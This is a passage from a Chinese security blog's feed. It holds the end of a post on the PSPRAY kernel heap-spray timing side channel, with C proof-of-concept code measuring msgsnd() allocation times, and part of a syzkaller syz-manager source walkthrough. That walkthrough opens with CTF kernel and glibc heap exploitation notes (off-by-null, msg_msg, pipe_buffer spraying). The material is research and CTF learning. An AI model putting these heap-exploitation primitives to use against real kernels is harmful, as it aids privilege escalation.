class="keyword">uint64_t</span> <span class="title">rdtsc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;rdtsc;&quot;</span></span><br><span class="line">        <span class="string">&quot;shl rdx,32;&quot;</span></span><br><span class="line">        <span class="string">&quot;add rax,rdx;&quot;</span></span><br><span class="line">        <span class="string">&quot;leave;&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msqid[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> exec_time[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msqid_ds</span> <span class="title">ds_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    bind_cpu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to get msg_queue&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = <span class="number">123456</span>;</span><br><span class="line">    ((struct msgbuf *)buf)-&gt;mtype = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin, end;</span><br><span class="line"></span><br><span class="line">        begin = rdtsc();</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;buf, <span class="number">512</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to alloc msg_msg&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        end = rdtsc();</span><br><span class="line"></span><br><span class="line">        exec_time[i] = end - begin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], buf, <span class="number">512</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0xdeadbeef</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to free msg_msg&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, &amp;ds_buf) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to free msg_queue&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用ctf题目进行了测试一下，发现还是存在非常明显的时间差的。</p><p><img   src="/images/image-20231123165208062.png"  alt="image-20231123165208062"></p><p>总的来说，利用方法还是比较简单的，想必看完了大家也应该都明白了如何利用此手法。</p><hr><p>参考链接：</p><p>​<a class="link"   href="https://arttnba3.cn/2023/09/16/PAPER-0X03-PSPRAY/" >https://arttnba3.cn/2023/09/16/PAPER-0X03-PSPRAY/<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://www.usenix.org/system/files/usenixsecurity23-lee-yoochan.pdf" >https://www.usenix.org/system/files/usenixsecurity23-lee-yoochan.pdf<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期在工作上遇到的内核很少，以至于我都快忘记了我是玩内核的了。这篇文章需要一点&lt;code&gt;slub allocator&lt;/code&gt;的基础，</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="堆喷射" scheme="https://196082.github.io/tags/%E5%A0%86%E5%96%B7%E5%B0%84/"/>
    
    <category term="侧信道攻击" scheme="https://196082.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
    <category term="slab源码分析" scheme="https://196082.github.io/tags/slab%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller: syz-manager源码分析</title>
    <link href="https://196082.github.io/2023/11/17/syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/"/>
    <id>https://196082.github.io/2023/11/17/syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/</id>
    <published>2023-11-17T03:40:06.000Z</published>
    <updated>2024-06-12T12:51:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章的前言主要提一下前段时间在强网拟态中的pwn，首先是内核pwn。</p><p>其实很简单就是一个简单版的<code>off by null</code>。但是我犯蠢了，在堆喷<code>pipe_buffer</code>时计算错误导致堆喷失败以至于在开始放弃了使用此方法，转而使用<code>msg_msg</code>形成双向链表造成UAF，可惜的是此方法因为<code>off by null</code>的限制使得其申请的堆块应该是从<code>kmalloc-192</code>或以下申请，所以很多可以堆喷来写入的结构体无法使用，如果继续使用<code>msg_msgseg</code>结构体来实现任意写也会因为其存在一个<code>next</code>指针导致无法<code>free</code>。最后这道题依旧是通过构造多级管道解出。</p><p>这里重点提一下那一道堆题（做完内核凌晨四点了，这道题没做）。简单描述一下漏洞，首先其<code>edit</code>函数中存在<code>off by null</code>，然后还可以在<code>create</code>函数中一直申请堆块，不过这里限制大小为 0~0x78 ，所有的堆块范围都在<code>fastbin</code>内。然后估摸着这题的利用方法应该和<code>top chunk</code>有关，但是仔细看了一下<code>house of force</code>发现条件并不满足，在比赛快结束时看了一下源码发现了以往不知道的机制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line"></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  av-&gt;top = remainder;</span><br><span class="line">  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  check_malloced_chunk (av, victim, nb);</span><br><span class="line">  <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">&#123;</span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line">  <span class="comment">/* restore original bin index */</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码是<code>_int_malloc</code>函数中的片段，这个片段是使用<code>top chunk</code>进行分配时的片段，首先是申请的大小加上16要小于<code>top chunk</code>的大小时进入到第一个分支中，这个分支所做的事情的对<code>top chunk</code>进行切割。</p><p>然后直接看最末的这一个分支，这个分支是前两个都不满足时会进入也就是无法从现有的<code>av</code>中得到空间了便开始使用<code>sysmalloc</code>进行分配。</p><p>中间的分支首先会检查<code>fastbin</code>中是否存在堆块随后进入到<code>malloc_consolidate</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的所做的事情就显而易见了，就是从<code>fastbin</code>中取出堆块进行合并放入到<code>unsorted bin</code>中。后续利用就不详细提了（因为我也没看了）但是估计就是通过<code>off by null</code>打<code>unlink</code>实现任意地址写。</p><p>下面回归正题开始<code>syzkaller</code>的分析，首先其工作原理在前一篇文章中提过，这里就不再重提了。前一篇文章提到<code>syzkaller</code>分为了三大组件，其实通过图就能看出来<code>syz-fuzzer</code>和<code>syz-executor</code>都是位于虚拟机中的，而<code>syz-manager</code>位于Host主机中。</p><p>这里直接分析函数，在分析函数的过程中将有用的结构体再进一步分析。</p><h2 id="RunManager函数"><a href="#RunManager函数" class="headerlink" title="RunManager函数"></a>RunManager函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> prog.GitRevision == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">flag.Parse()</span><br><span class="line">log.EnableLogCaching(<span class="number">1000</span>, <span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">cfg, err := mgrconfig.LoadFile(*flagConfig)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">RunManager(cfg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看<code>syz-manager</code>的<code>main</code>函数，其会读取传入的配置文件然后直接调用<code>RunManager</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RunManager</span><span class="params">(cfg *mgrconfig.Config)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> vmPool *vm.Pool</span><br><span class="line"><span class="keyword">if</span> cfg.Type != <span class="string">&quot;none&quot;</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">vmPool, err = vm.Create(cfg, *flagDebug)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是初始化<code>VM pool</code>使用<code>vm.Create</code>函数进行创建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(cfg *mgrconfig.Config, debug <span class="keyword">bool</span>)</span> <span class="params">(*Pool, error)</span></span> &#123;</span><br><span class="line">typ, ok := vmimpl.Types[vmType(cfg.Type)]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)</span><br><span class="line">&#125;</span><br><span class="line">env := &amp;vmimpl.Env&#123;</span><br><span class="line">Name:      cfg.Name,</span><br><span class="line">OS:        cfg.TargetOS,</span><br><span class="line">Arch:      cfg.TargetVMArch,</span><br><span class="line">Workdir:   cfg.Workdir,</span><br><span class="line">Image:     cfg.Image,</span><br><span class="line">SSHKey:    cfg.SSHKey,</span><br><span class="line">SSHUser:   cfg.SSHUser,</span><br><span class="line">Timeouts:  cfg.Timeouts,</span><br><span class="line">Debug:     debug,</span><br><span class="line">Config:    cfg.VM,</span><br><span class="line">KernelSrc: cfg.KernelSrc,</span><br><span class="line">&#125;</span><br><span class="line">impl, err := typ.Ctor(env)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;Pool&#123;</span><br><span class="line">impl:     impl,</span><br><span class="line">workdir:  env.Workdir,</span><br><span class="line">template: cfg.WorkdirTemplate,</span><br><span class="line">timeouts: cfg.Timeouts,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要做的事情是，首先获取VM类型，随后封装env结构体，最后调用<code>VM Pool</code>构造函数并返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Pool <span class="keyword">struct</span> &#123;</span><br><span class="line">impl        vmimpl.Pool</span><br><span class="line">workdir     <span class="keyword">string</span></span><br><span class="line">template    <span class="keyword">string</span></span><br><span class="line">timeouts    targets.Timeouts</span><br><span class="line">activeCount <span class="keyword">int32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单提一下Pool结构体，类似于线程池的概念，在<code>syz-manager</code>使用一个VM池也就是Pool结构体来管理<code>Guest VM</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pool represents a set of test machines (VMs, physical devices, etc) of particular type.</span></span><br><span class="line">type Pool interface &#123;</span><br><span class="line"><span class="comment">// Count returns total number of VMs in the pool.</span></span><br><span class="line">Count() <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create creates and boots a new VM instance.</span></span><br><span class="line">Create(workdir <span class="built_in">string</span>, index <span class="keyword">int</span>) (Instance, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其接口实现又两个函数，第一个是返回当前池子里所有的VM数量，第二个是创建并启动一个新的实例，并且返回这个实例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crashdir := filepath.Join(cfg.Workdir, <span class="string">&quot;crashes&quot;</span>)</span><br><span class="line">osutil.MkdirAll(crashdir)</span><br><span class="line"></span><br><span class="line">reporter, err := report.NewReporter(cfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">&quot;%v&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>RunManager</code>函数中，这里主要做的事情是创建一个<code>crashes</code>目录，然后生成一个<code>reporter</code>实例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Report <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// Title contains a representative description of the first oops.</span></span><br><span class="line">Title <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Alternative titles, used for better deduplication.</span></span><br><span class="line"><span class="comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span></span><br><span class="line">AltTitles []<span class="keyword">string</span></span><br><span class="line"><span class="comment">// Bug type (e.g. hang, memory leak, etc).</span></span><br><span class="line">Type Type</span><br><span class="line"><span class="comment">// The indicative function name.</span></span><br><span class="line">Frame <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Report contains whole oops text.</span></span><br><span 